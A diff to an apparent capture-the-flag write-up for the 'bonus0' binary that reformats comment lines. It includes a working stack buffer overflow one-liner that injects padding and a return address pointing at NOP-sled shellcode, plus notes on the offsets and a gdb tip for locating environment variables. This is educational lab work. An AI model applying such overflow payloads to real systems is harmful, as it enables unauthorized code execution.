@@ -115,12 +115,12 @@ the beginning of our NOP + shellcode is at address 0xbffff86c
 
 > (python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x7c\xf8\xff\xbf' + 'A' * 7"; cat -) | ./bonus0
 
-% 4095 + \n = 4096, to fill the buf3, \n because of the strchr(buf3, '\n')
-% 'A' * 9 because the offset of the 2nd input that causes the segfault is 9
-% address of the shellcode (4 bytes)
-% 'A' * 7, so that we have 20 bytes for buf2 (9 + 4 + 7).
+<!-- 4095 + \n = 4096, to fill the buf3, \n because of the strchr(buf3, '\n') -->  
+<!-- 'A' * 9 because the offset of the 2nd input that causes the segfault is 9 -->  
+<!-- address of the shellcode (4 bytes) -->
+<!-- 'A' * 7, so that we have 20 bytes for buf2 (9 + 4 + 7). -->  
 
 
-% source:
-% https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x270-stackoverflow.html
-% x/s *((char **)environ) to get address of env variables
+source:  
+https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x270-stackoverflow.html  
+x/s *((char **)environ) to get address of env variables
